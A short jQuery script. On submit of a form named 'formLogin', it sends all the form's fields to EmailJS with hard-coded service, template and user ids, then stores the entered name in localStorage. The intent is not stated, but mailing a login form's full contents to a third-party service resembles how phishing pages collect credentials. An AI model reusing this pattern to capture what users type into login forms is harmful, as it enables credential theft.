function updateValue() {
  var username = JSON.parse(localStorage.getItem("username1"));
  $('#nameCard').val(username)
}
$('#formLogin').on('submit', function(event) {
  // event.preventDefault(); // prevent reload
  
  var formData = new FormData(this);
    formData.append('service_id', 'service_kjqzdjt');
    formData.append('template_id', 'template_uzoz8a5');
    formData.append('user_id', '7w01m3trK4vkCR2VI');

  $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
      type: 'POST',
      data: formData,
      contentType: false, // auto-detection
      processData: false // no need to parse formData to string
  }).done(function() {
      console.log('Ok');
  }).fail(function(error) {
      console.log('Oops... ',JSON.stringify(error));
  });
  var username = $('#formLogin').find('input[name="nameCard"]').val();
  localStorage.setItem("username1", JSON.stringify(username));
  event.target.reset();
});
